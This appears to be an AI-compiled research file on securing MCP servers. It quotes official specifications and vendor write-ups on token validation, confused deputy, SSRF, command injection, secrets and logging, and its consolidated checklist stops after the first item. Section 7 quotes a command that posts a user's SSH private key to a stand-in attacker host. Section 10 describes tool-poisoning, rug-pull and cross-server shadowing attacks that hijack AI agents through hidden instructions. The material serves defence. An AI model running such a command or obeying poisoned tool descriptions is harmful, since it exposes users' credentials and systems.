# Security Engineering for MCP Server Developers (Protocol Revision 2026-07-28)

Research file. Retrieved: 2026-10-03. Protocol revision referenced throughout: **2026-07-28**.

## Notation and evidence ranking

- **SOURCE FACT** — a normative statement quoted verbatim from an official specification/SEP or official documentation page.
- **SOURCE CLAIM (Rank N)** — a non-normative statement quoted verbatim. Ranks: **Rank A** = Final/Standards-Track SEP or normative specification text; **Rank B** = official documentation page (editorial guidance); **Rank C** = vendor/security-research blog or third-party analysis.
- **AI INFERENCE** — my reasoning that names the specific quoted facts it is derived from.
- **PLAUSIBLE NOT VERIFIED** — a conjecture consistent with sources but not directly stated.
- **UNKNOWN** — no source retrieved or source is silent.

Quotations are short and exact. Every externally sourced fact carries an inline link to the source URL. No end-only bibliography is used. Retrieval status for this file: all six requested MCP URLs were retrieved successfully; the OWASP GenAI landing page and the OWASP MCP Top 10 page were retrieved; the Invariant Labs, Microsoft, and Docker pages were retrieved. No failed retrievals for FILE 1.

## 1. Threat model for an MCP server

**SOURCE FACT.** The protocol's own security document frames the audience and scope: "This document identifies security risks, attack vectors, and best practices specific to MCP implementations." and its "primary audience ... includes developers implementing MCP authorization flows, MCP server operators, and security professionals evaluating MCP-based systems." ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md))

**SOURCE FACT.** The specification requires implementers to follow the normative security requirements: "Implementations of this specification **MUST** follow the normative security requirements in [Security Considerations](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations), covering token audience binding and validation, token theft, communication security, authorization code protection, mix-up and confused deputy attacks, open redirection, and Client ID Metadata Document security." ([Authorization](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md))

**SOURCE FACT.** Authorization is optional but conditional on transport: "Authorization is **OPTIONAL** for MCP implementations. When supported: Implementations using an HTTP-based transport **SHOULD** conform to this specification. Implementations using an STDIO transport **SHOULD NOT** follow this specification, and instead retrieve credentials from the environment." ([Authorization](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md))

**SOURCE FACT.** The tools specification states the server-side security baseline: "Servers **MUST**: Validate all tool inputs; Implement proper access controls; Rate limit tool invocations; Sanitize tool outputs." ([Tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools.md))

**SOURCE FACT.** The tools specification also warns that tool metadata is not trustworthy by default: "For trust & safety and security, clients **MUST** consider tool annotations to be untrusted unless they come from trusted servers." ([Tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools.md))

**SOURCE CLAIM (Rank C).** The OWASP MCP Top 10 is presented as a protocol-specific risk catalog: "The MCP list is narrower and more protocol specific. It targets the tool discovery, context passing, and tool invocation layer between an AI agent and external systems, which makes it directly relevant to anyone deploying MCP servers in production." ([OWASP MCP Top 10 guide](https://cycode.com/blog/owasp-mcp-top-10/))

**SOURCE CLAIM (Rank C).** The same guide enumerates ten categories with primary defenses, including "MCP03 | Tool Poisoning | Signed, pinned tools; description scanning", "MCP04 | Supply Chain Attacks and Dependency Tampering | Signed components; AIBOM and provenance", and "MCP05 | Command Injection and Execution | Input validation; sandboxed execution". ([OWASP MCP Top 10 guide](https://cycode.com/blog/owasp-mcp-top-10/))

**SOURCE CLAIM (Rank C).** OWASP's agentic framework is described as peer-reviewed: "The OWASP Top 10 for Agentic Applications 2026 is a globally peer-reviewed framework that identifies the most critical security risks facing autonomous and agentic AI systems." ([OWASP Top 10 for Agentic Applications for 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/))

**AI INFERENCE (naming the scope and baseline facts).** A defensible server threat model starts from the quoted scope statement ("security risks, attack vectors, and best practices specific to MCP implementations") and the quoted server baseline ("Validate all tool inputs; Implement proper access controls; Rate limit tool invocations; Sanitize tool outputs"). The transport split ("STDIO ... retrieve credentials from the environment") means the threat model differs by transport: HTTP servers inherit the OAuth attack surface, while STDIO servers inherit the local-process attack surface.

## 2. Token audience validation and no token passthrough

**SOURCE FACT.** The authorization specification makes audience binding mandatory: "MCP servers **MUST** validate that access tokens were issued specifically for them as the intended audience, according to [RFC 8707 Section 2]." ([Authorization](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md))

**SOURCE FACT.** The same section forbids accepting or forwarding foreign tokens: "MCP servers **MUST NOT** accept or transit any other tokens." and "MCP clients **MUST NOT** send tokens to the MCP server other than ones issued by the MCP server's authorization server." ([Authorization](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md))

**SOURCE FACT.** The security-considerations page repeats the requirement and names the upstream case: "MCP servers **MUST** only accept tokens specifically intended for themselves and **MUST** reject tokens that do not include them in the audience claim or otherwise verify that they are the intended recipient of the token." and "The MCP server **MUST NOT** pass through the token it received from the MCP client." ([Authorization Security Considerations](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations.md))

**SOURCE FACT.** The best-practices document defines the anti-pattern: ""Token passthrough" is an anti-pattern where an MCP server accepts tokens from an MCP client without validating that the tokens were properly issued *to the MCP server* and passes them through to the downstream API." ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md))

**SOURCE FACT.** The mitigation is stated as a hard rule: "MCP servers **MUST NOT** accept any tokens that were not explicitly issued for the MCP server." ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md))

**SOURCE FACT.** The best-practices document lists the concrete risks of passthrough, including "Security Control Circumvention", "Accountability and Audit Trail Issues", and "Trust Boundary Issues". ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md))

**SOURCE FACT.** The tutorial warns against hand-rolling validation: "**Do not implement token validation or authorization logic by yourself**. Use off-the-shelf, well-tested, and secure libraries for things like token validation or authorization decisions." ([Understanding Authorization in MCP](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/authorization.md))

**SOURCE FACT.** The tutorial also warns against generic audiences: "**Audience/resource indicator misuse**. Don't configure or accept generic audiences (like `api`) or unrelated resources. Require the audience/resource to match your configured server." ([Understanding Authorization in MCP](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/authorization.md))

**AI INFERENCE (naming the audience and passthrough facts).** The quoted rules compose into a single invariant: a server must verify the token's audience equals its own canonical resource URI ("issued specifically for them as the intended audience") and must never forward that token ("MUST NOT pass through the token it received from the MCP client"). The tutorial's "Do not implement token validation ... by yourself" implies the audience check should come from a vetted library rather than custom claim parsing.

## 3. Confused deputy

**SOURCE FACT.** The best-practices document defines the attack: "Attackers can exploit MCP proxy servers that connect to third-party APIs, creating "[confused deputy](https://en.wikipedia.org/wiki/Confused_deputy_problem)" vulnerabilities." ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md))

**SOURCE FACT.** The vulnerable conditions are enumerated: "MCP proxy server uses a **static client ID** with a third-party authorization server"; "MCP proxy server allows MCP clients to **dynamically register** (each getting their own client\_id)"; "The third-party authorization server sets a **consent cookie** after the first authorization"; "MCP proxy server does not implement proper per-client consent before forwarding to third-party authorization". ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md))

**SOURCE FACT.** The mitigation is mandatory: "To prevent confused deputy attacks, MCP proxy servers **MUST** implement per-client consent and proper security controls as detailed below." ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md))

**SOURCE FACT.** The security-considerations page states the proxy rule: "MCP proxy servers using static client IDs **MUST** obtain user consent for each [dynamically registered client] before forwarding to third-party authorization servers (which may require additional consent)." ([Authorization Security Considerations](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations.md))

**SOURCE FACT.** The consent UI requirements include: "Clearly identify the requesting MCP client by name"; "Display the specific third-party API scopes being requested"; "Show the registered `redirect_uri` where tokens will be sent"; "Implement CSRF protection (e.g., state parameter, CSRF tokens)"; "Prevent iframing via `frame-ancestors` CSP directive or `X-Frame-Options: DENY` to prevent clickjacking". ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md))

**SOURCE FACT.** Redirect URI validation is exact-match: "Validate that the `redirect_uri` in authorization requests exactly matches the registered URI"; "Reject requests if the `redirect_uri` has changed without re-registration"; "Use exact string matching (not pattern matching or wildcards)". ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md))

**SOURCE FACT.** The OAuth `state` parameter must be bound to consent: "The consent cookie or session containing the `state` value **MUST NOT** be set until **after** the user has approved the consent screen at the MCP server's authorization endpoint." ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md))

**AI INFERENCE (naming the confused-deputy facts).** The attack requires the conjunction of four quoted conditions; removing any one breaks it. The strongest structural fix is the quoted per-client consent requirement ("MUST implement per-client consent"), because it addresses the root cause (a shared static client ID plus a consent cookie) rather than a single symptom.

## 4. State-handle hijacking

**SOURCE FACT.** The best-practices document defines the vector: "State handle hijacking is an attack vector where an unauthorized party obtains or guesses such a handle and uses it to access or modify another user's state." ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md))

**SOURCE FACT.** The rule is explicit: "MCP servers that implement authorization **MUST** verify all inbound requests. MCP servers **MUST NOT** treat possession of a state handle as authentication." ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md))

**SOURCE FACT.** Handle generation and binding guidance: "MCP servers **SHOULD** use secure, non-deterministic handles generated with secure random number generators." and "MCP servers **SHOULD** bind handles server-side to the authenticated user, for example by keying stored state as `<user_id>:<handle>` where the user ID is derived from the verified token rather than supplied by the client, and reject a handle presented by any other principal." ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md))

**SOURCE FACT.** The tools specification gives the same design guidance for stateful tools: "For authenticated servers, a handle is a name, not a capability. The server should validate the caller's authorization against the handle on every call." ([Tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools.md))

**SOURCE FACT.** The tools specification also recommends opacity and bounded lifetime: "Handles that encode internal structure invite parsing or guessing; opaque identifiers do not." and "Because handles outlive any single connection, the server's retention policy should be stated in the creation tool's description". ([Tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools.md))

**AI INFERENCE (naming the state-handle facts).** The quoted rule "MUST NOT treat possession of a state handle as authentication" plus the binding pattern `<user_id>:<handle>` means the handle is only a lookup key; authorization must be re-derived from the verified token on every call. This is consistent with the protocol's statelessness, where "State that needs to span multiple requests ... **MUST** be referenced by an explicit identifier the client passes on each request." ([Basic Protocol](https://modelcontextprotocol.io/specification/2026-07-28/basic/index.md))

## 5. SSRF

**SOURCE FACT.** The best-practices document defines the attack: "Server-Side Request Forgery (SSRF) is an attack where an attacker can induce an MCP client to make HTTP requests to unintended destinations, potentially accessing internal network resources, cloud metadata endpoints, or other protected services." ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md))

**SOURCE FACT.** The attack surface is OAuth metadata discovery: "During OAuth metadata discovery, MCP clients fetch URLs from several sources that could be controlled by a malicious MCP server: The `resource_metadata` URL from the `WWW-Authenticate` header; The `authorization_servers` URLs from the Protected Resource Metadata document; The `token_endpoint`, `authorization_endpoint`, and other URLs from Authorization Server Metadata". ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md))

**SOURCE FACT.** The mitigation includes blocking private ranges: "MCP clients **SHOULD** block requests to private and reserved IP address ranges as recommended by [RFC 9728 Section 7.7]". ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md))

**SOURCE FACT.** The document warns against custom IP parsing: "Avoid implementing IP validation manually. Attackers exploit encoding tricks (octal, hex, IPv4-mapped IPv6) that custom parsers often miss." ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md))

**SOURCE FACT.** Egress control is recommended: "For server-side MCP client deployments, operators **SHOULD** consider using an egress proxy that enforces network policies". ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md))

**SOURCE FACT.** The same SSRF risk applies to authorization servers fetching client metadata: "When an authorization server supports [Client ID Metadata Documents], the authorization server takes a URL as input from an unknown client and fetches that URL. A malicious client could use this to trigger the authorization server to make requests to arbitrary URLs". ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md))

**AI INFERENCE (naming the SSRF facts).** The quoted warning "Avoid implementing IP validation manually" plus the quoted egress-proxy recommendation implies defense in depth: validate URLs, block private ranges with a vetted library, and route outbound discovery through a policy-enforcing proxy. The quoted extension to authorization servers means the same control must be applied on both the client and server sides of discovery.

## 6. Input validation and path traversal

**SOURCE FACT.** The tools specification requires input validation and output sanitization: "Servers **MUST**: Validate all tool inputs ... Sanitize tool outputs." ([Tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools.md))

**SOURCE FACT.** The protocol's JSON Schema rules bound validation cost: "Implementations **SHOULD** apply reasonable bounds, such as a maximum schema depth, a cap on the total number of subschemas, or a per-validation time budget, to prevent a malicious schema from acting as a Denial-of-Service vector against the validator." ([Basic Protocol](https://modelcontextprotocol.io/specification/2026-07-28/basic/index.md))

**SOURCE FACT.** Network `$ref` dereferencing is off by default: "Implementations **MUST NOT** automatically dereference `$ref` values that resolve to a network URI." ([Basic Protocol](https://modelcontextprotocol.io/specification/2026-07-28/basic/index.md))

**SOURCE FACT.** SEP-1303 makes validation errors model-visible: "This SEP proposes treating tools input validation errors as Tool Execution Errors rather than Protocol Errors." and "**Tool Execution Errors** should be used for all tool argument validation failures". ([SEP-1303](https://modelcontextprotocol.io/seps/1303-input-validation-errors-as-tool-execution-errors))

**SOURCE FACT.** The tools specification now reflects that split: "**Tool Execution Errors** contain actionable feedback that language models can use to self-correct and retry with adjusted parameters: API failures; Input validation errors (e.g., date in wrong format, value out of range); Business logic errors". ([Tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools.md))

**SOURCE CLAIM (Rank C).** The OWASP MCP Top 10 guide reports measured exposure: "82 percent path traversal exposure and 34 percent command injection exposure across 2,614 surveyed servers." ([OWASP MCP Top 10 guide](https://cycode.com/blog/owasp-mcp-top-10/))

**AI INFERENCE (naming the validation facts).** The quoted server requirement ("Validate all tool inputs") plus the quoted SEP-1303 rule ("Tool Execution Errors should be used for all tool argument validation failures") means validation failures should be returned as `isError: true` tool results, not JSON-RPC protocol errors, so the model can self-correct. Path traversal is not named in the MCP specification text retrieved; the quoted OWASP figure is the only retrieved quantification, and it is a Rank C claim.

## 7. Command injection

**SOURCE FACT.** The best-practices document shows malicious startup commands as an attack class, e.g. "`npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location`". ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md))

**SOURCE FACT.** The OAuth URL section names shell execution as a vector: "A malicious MCP server provides a URL containing shell command injection payloads"; "The MCP client uses shell commands (e.g., `cmd.exe`, PowerShell, or shell scripts) to open the URL"; "The shell interprets parts of the URL as additional commands to execute". ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md))

**SOURCE FACT.** The mitigation is a hard rule: "MCP clients **MUST NOT** use shell commands (e.g., `cmd.exe`, `sh`, PowerShell) to open URLs" and "**SHOULD** use platform-specific, non-shell URL opening mechanisms". ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md))

**SOURCE CLAIM (Rank C).** The OWASP MCP Top 10 guide reports: "43 percent of MCP CVEs in January and February 2026 were shell injection class vulnerabilities." ([OWASP MCP Top 10 guide](https://cycode.com/blog/owasp-mcp-top-10/))

**SOURCE CLAIM (Rank C).** The same guide recommends parameterized APIs: "Wrap every shell, file, and network call in a parameterized API with strict input validation." ([OWASP MCP Top 10 guide](https://cycode.com/blog/owasp-mcp-top-10/))

**AI INFERENCE (naming the command-injection facts).** The quoted rule "MUST NOT use shell commands ... to open URLs" is the client-side control; on the server side the quoted OWASP recommendation ("Wrap every shell, file, and network call in a parameterized API") is the corresponding control. Both are consistent with the quoted tools requirement to "Validate all tool inputs".

## 8. Sandboxing and least privilege

**SOURCE FACT.** The best-practices document recommends sandboxing local servers: "Execute MCP server commands in a sandboxed environment with minimal default privileges"; "Launch MCP servers with restricted access to the file system, network, and other system resources"; "Use platform-appropriate sandboxing technologies (containers, chroot, application sandboxes, etc.)". ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md))

**SOURCE FACT.** Local servers should limit their own exposure: "MCP servers intending for their servers to be run locally **SHOULD** implement measures to prevent unauthorized usage from malicious processes: Use the `stdio` transport to limit access to just the MCP client; Restrict access if using an HTTP transport, such as: Require an authorization token; Use unix domain sockets or other Interprocess Communication (IPC) mechanisms with restricted access". ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md))

**SOURCE FACT.** The scope-minimization section recommends progressive privilege: "Implement a progressive, least-privilege scope model: Minimal initial scope set (e.g., `mcp:tools-basic`) containing only low-risk discovery/read operations; Incremental elevation via targeted `WWW-Authenticate` `scope="..."` challenges when privileged operations are first attempted". ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md))

**SOURCE FACT.** The tutorial lists least-privilege scopes as a pitfall to avoid: "**Least-privilege scopes**. Don't use catch‑all scopes. Split access per tool or capability where possible and verify required scopes per route/tool on the resource server." ([Understanding Authorization in MCP](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/authorization.md))

**SOURCE CLAIM (Rank C).** Docker's incident write-up argues for container isolation: "Every time you run `npx -y @untrusted/mcp-server` or `uvx some-mcp-tool`, you're executing arbitrary code directly on your host system with full access to: Your entire file system; All network connections; Environment variables and secrets; System resources". ([MCP Horror Stories: The Supply Chain Attack](https://www.docker.com/blog/mcp-horror-stories-the-supply-chain-attack/))

**AI INFERENCE (naming the sandboxing facts).** The quoted "minimal default privileges" and "restricted access to the file system, network, and other system resources" define least privilege at the process level; the quoted progressive scope model defines it at the authorization level. The two are complementary: sandboxing bounds what a compromised server can reach, while scope minimization bounds what a stolen token can do.

## 9. Secrets management

**SOURCE FACT.** The tutorial warns against embedding credentials: "Never embed client credentials directly in your code. We recommend using environment variables or specialized solutions for secret storage." ([Understanding Authorization in MCP](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/authorization.md))

**SOURCE FACT.** The tutorial separates credential roles: "**Separate app vs. resource server credentials**. Don't reuse your MCP server's client secret for end‑user flows. Store all secrets in a proper secret manager, not in source control." ([Understanding Authorization in MCP](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/authorization.md))

**SOURCE FACT.** Token storage must be protected: "**Store tokens in secure, encrypted storage**. In certain scenarios, you might need to cache tokens server-side. If that is the case, ensure that the storage has the right access controls and cannot be easily exfiltrated by malicious parties with access to your server." ([Understanding Authorization in MCP](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/authorization.md))

**SOURCE FACT.** Short-lived tokens reduce blast radius: "Authorization servers **SHOULD** issue short-lived access tokens to reduce the impact of leaked tokens." ([Authorization Security Considerations](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations.md))

**SOURCE FACT.** The tutorial recommends short lifetimes: "**Use short-lived access tokens**. Depending on the authorization server used, this setting might be customizable. We recommend to not use long-lived tokens - if a malicious actor steals them, they will be able to maintain their access for longer periods." ([Understanding Authorization in MCP](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/authorization.md))

**SOURCE CLAIM (Rank C).** Docker describes a secret store that avoids environment variables: "Instead of environment variables, Docker MCP uses Docker Desktop's secure secret store" and "Secrets are never exposed as environment variables". ([MCP Horror Stories: The Supply Chain Attack](https://www.docker.com/blog/mcp-horror-stories-the-supply-chain-attack/))

**AI INFERENCE (naming the secrets facts).** The quoted "Never embed client credentials directly in your code" plus "Store all secrets in a proper secret manager, not in source control" and "Store tokens in secure, encrypted storage" define three distinct secret classes (client credentials, tokens, and end-user secrets) that each need a managed store rather than source or environment leakage.

## 10. Tool poisoning and prompt injection via descriptions and results

**SOURCE CLAIM (Rank C).** Invariant Labs defines the attack: "A Tool Poisoning Attack occurs when malicious instructions are embedded within MCP tool descriptions that are invisible to users but visible to AI models." ([MCP Security Notification: Tool Poisoning Attacks](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks))

**SOURCE CLAIM (Rank C).** The same post describes rug pulls: "the package or server-based architecture of MCP allows for *rug pulls* - where a malicious server can change the tool description after the client has already approved it." ([MCP Security Notification: Tool Poisoning Attacks](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks))

**SOURCE CLAIM (Rank C).** It also describes cross-server shadowing: "the shadowing attack is enough to hijack the agent's behavior with respect to trusted servers. This means that an attacker does not necessarily need to get the agent to use their tool, but can instead modify the agent's behavior with respect to other servers". ([MCP Security Notification: Tool Poisoning Attacks](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks))

**SOURCE CLAIM (Rank C).** Invariant's recommended mitigations include: "**Tool and Package Pinning:** Clients should pin the version of the MCP server and its tools to prevent unauthorized changes." and "**Cross-Server Protection**: Implement stricter boundaries and dataflow controls between different MCP servers". ([MCP Security Notification: Tool Poisoning Attacks](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks))

**SOURCE CLAIM (Rank C).** Microsoft frames the broader class: "An **Indirect Prompt Injection** vulnerability (also known as cross-domain prompt injection or XPIA) is a security exploit targeting generative AI systems where malicious instructions are embedded in external content, such as documents, web pages, or emails." ([Protecting against indirect prompt injection attacks in MCP](https://developer.microsoft.com/blog/protecting-against-indirect-injection-attacks-mcp/))

**SOURCE CLAIM (Rank C).** Microsoft defines tool poisoning as a subset: "A type of Indirect Prompt Injection attack known as **Tool Poisoning** is a vulnerability where an attacker embeds malicious instructions within the descriptions of MCP tools." ([Protecting against indirect prompt injection attacks in MCP](https://developer.microsoft.com/blog/protecting-against-indirect-injection-attacks-mcp/))

**SOURCE CLAIM (Rank C).** Microsoft recommends prompt shields and supply-chain controls: "To mitigate the risks of an Indirect Prompt Injection attacks in your AI system, we recommend two approaches: implementing AI prompt shields ... and establishing robust supply chain security mechanisms, ensuring that only approved packages and applications are used within an organization." ([Protecting against indirect prompt injection attacks in MCP](https://developer.microsoft.com/blog/protecting-against-indirect-injection-attacks-mcp/))

**SOURCE FACT.** The protocol itself requires human oversight for tool invocation: "For trust & safety and security, there **SHOULD** always be a human in the loop with the ability to deny tool invocations." ([Tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools.md))

**SOURCE FACT.** The client best-practices page treats cross-server results as untrusted: "Tool results from one server are untrusted input to another." ([Client Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/develop/clients/client-best-practices))

**AI INFERENCE (naming the poisoning facts).** The quoted definitions ("malicious instructions are embedded within MCP tool descriptions") and the quoted rug-pull behavior ("change the tool description after the client has already approved it") imply that a server author cannot rely on install-time approval; the quoted pinning mitigation ("pin the version of the MCP server and its tools") and the quoted human-in-the-loop requirement are the two controls that directly address description drift and result-borne injection.

## 11. Supply chain: dependencies and package provenance

**SOURCE CLAIM (Rank C).** Docker documents a real incident: "CVE-2025-6514 is a critical vulnerability in mcp-remote that affects how AI tools like Claude Desktop, VS Code, and Cursor connect to external services. With a devastating CVSS score of 9\.6 out of 10, this vulnerability represents the first documented case of full remote code execution achieved against an MCP client in a real-world scenario." ([MCP Horror Stories: The Supply Chain Attack](https://www.docker.com/blog/mcp-horror-stories-the-supply-chain-attack/))

**SOURCE CLAIM (Rank C).** The root cause is described as unvalidated server-provided endpoints: "mcp-remote, a widely-used OAuth proxy for AI applications, trusts server-provided OAuth endpoints without validation." ([MCP Horror Stories: The Supply Chain Attack](https://www.docker.com/blog/mcp-horror-stories-the-supply-chain-attack/))

**SOURCE CLAIM (Rank C).** The scale is quantified: "The mcp-remote package has been downloaded more than 437,000 times, making this vulnerability a supply chain attack affecting hundreds of thousands of AI development environments." ([MCP Horror Stories: The Supply Chain Attack](https://www.docker.com/blog/mcp-horror-stories-the-supply-chain-attack/))

**SOURCE CLAIM (Rank C).** Docker's proposed controls include "**Cryptographic verification** ensuring images haven't been tampered with" and "**Immutable distribution** through Docker Hub's secure infrastructure". ([MCP Horror Stories: The Supply Chain Attack](https://www.docker.com/blog/mcp-horror-stories-the-supply-chain-attack/))

**SOURCE CLAIM (Rank C).** The OWASP MCP Top 10 guide recommends provenance artifacts: "Maintain an AIBOM across the ADLC that includes every MCP server, connector, and dependency." and "Require signed releases and verified publisher signals for any MCP component." ([OWASP MCP Top 10 guide](https://cycode.com/blog/owasp-mcp-top-10/))

**SOURCE CLAIM (Rank C).** Microsoft states the general principle: "Supply chain security fundamentals persist in the AI era: verify all components before integration (including models, not just code packages), maintain secure deployment pipelines, and implement continuous application and security monitoring." ([Protecting against indirect prompt injection attacks in MCP](https://developer.microsoft.com/blog/protecting-against-indirect-injection-attacks-mcp/))

**AI INFERENCE (naming the supply-chain facts).** The quoted CVE-2025-6514 root cause ("trusts server-provided OAuth endpoints without validation") is a client-side validation failure, while the quoted Docker controls ("Cryptographic verification", "Immutable distribution") and OWASP recommendations ("AIBOM", "signed releases and verified publisher signals") address artifact integrity. A server author controls the latter directly by publishing signed, pinned, reproducible artifacts.

## 12. Local server consent

**SOURCE FACT.** SEP-1024 is a Final, Standards-Track requirement for clients: "MCP clients that support one-click local MCP server configuration **MUST** implement the following security controls". ([SEP-1024](https://modelcontextprotocol.io/seps/1024-mcp-client-security-requirements-for-local-server-.md))

**SOURCE FACT.** The consent dialog must show the exact command: "Display a clear consent dialog that shows: The exact command that will be executed, without truncation; All arguments and parameters; A clear warning that this operation may be potentially dangerous". ([SEP-1024](https://modelcontextprotocol.io/seps/1024-mcp-client-security-requirements-for-local-server-.md))

**SOURCE FACT.** SEP-1024's motivation names the attack: "The current MCP specification lacks explicit security requirements for client-side installation flows, allowing malicious actors to execute arbitrary commands on user systems through crafted MCP server configurations distributed via links or social engineering." ([SEP-1024](https://modelcontextprotocol.io/seps/1024-mcp-client-security-requirements-for-local-server-.md))

**SOURCE FACT.** The best-practices document restates the client requirement: "If an MCP client supports one-click local MCP server configuration, it **MUST** implement proper consent mechanisms prior to executing commands." ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md))

**SOURCE FACT.** The best-practices document adds server-side guidance: "MCP servers intending for their servers to be run locally **SHOULD** implement measures to prevent unauthorized usage from malicious processes". ([Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md))

**SOURCE FACT.** SEP-1024 acknowledges residual risk: "Even with these controls, risks remain: User Override: Users may approve malicious commands despite warnings; Sophisticated Obfuscation: Advanced attackers may craft commands that appear legitimate; Implementation Gaps: Clients may implement controls incorrectly". ([SEP-1024](https://modelcontextprotocol.io/seps/1024-mcp-client-security-requirements-for-local-server-.md))

**AI INFERENCE (naming the consent facts).** The quoted requirement ("MUST implement proper consent mechanisms prior to executing commands") is a client obligation, but it constrains server authors: a local server's install command is the artifact users must review, so the quoted "exact command ... without truncation" requirement means server packaging should avoid obfuscated or multi-stage install commands.

## 13. Logging without leaking secrets

**SOURCE FACT.** The tutorial lists logging hygiene as a pitfall: "**Don't log credentials**. Never log `Authorization` headers, tokens, codes, or secrets. Scrub query strings and headers. Redact sensitive fields in structured logs." ([Understanding Authorization in MCP](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/authorization.md))

**SOURCE FACT.** The logging specification makes it normative: "Log messages **MUST NOT** contain: Credentials or secrets; Personal identifying information; Internal system details that could aid attacks". ([Logging](https://modelcontextprotocol.io/specification/2026-07-28/server/utilities/logging.md))

**SOURCE FACT.** The logging specification also requires rate limiting and validation: "Implementations **SHOULD**: Rate limit messages; Validate all data fields; Control log access; Monitor for sensitive content". ([Logging](https://modelcontextprotocol.io/specification/2026-07-28/server/utilities/logging.md))

**SOURCE FACT.** The debugging guide recommends sanitization: "**Sensitive Data**: Sanitize logs; Protect credentials; Mask personal information". ([Debugging](https://modelcontextprotocol.io/docs/2026-07-28/tools/debugging.md))

**SOURCE FACT.** The tutorial recommends generic client errors with detailed internal logs: "**Error detail leakage**. Return generic messages to clients, but log detailed reasons with correlation IDs internally to aid troubleshooting without exposing internals." ([Understanding Authorization in MCP](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/authorization.md))

**SOURCE FACT.** The logging feature is deprecated in this revision: "The Logging feature is deprecated as of protocol version `2026-07-28`" and "New implementations **SHOULD NOT** adopt it; existing implementations **SHOULD** migrate to logging to `stderr` for stdio transports, or to [OpenTelemetry] for structured observability." ([Logging](https://modelcontextprotocol.io/specification/2026-07-28/server/utilities/logging.md))

**AI INFERENCE (naming the logging facts).** The quoted prohibition ("Log messages **MUST NOT** contain: Credentials or secrets") plus the quoted deprecation ("New implementations **SHOULD NOT** adopt it") means a new server should log to stderr or OpenTelemetry, and must apply the same redaction rules there. The quoted "Return generic messages to clients, but log detailed reasons with correlation IDs internally" separates the client-visible error from the operator-visible detail.

## 14. Consolidated server-author checklist

**AI INFERENCE (naming the facts above).** The following checklist is derived only from the quoted facts in this file:

1. Validate every inbound token's audience against your own canonical resource URI, and never forward it — from "MCP servers **MUST** validate that access tokens were issued specifically for them as the intended audience" and "MCP servers **MUST NOT** accept or transit any other tokens" ([Authorization](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).
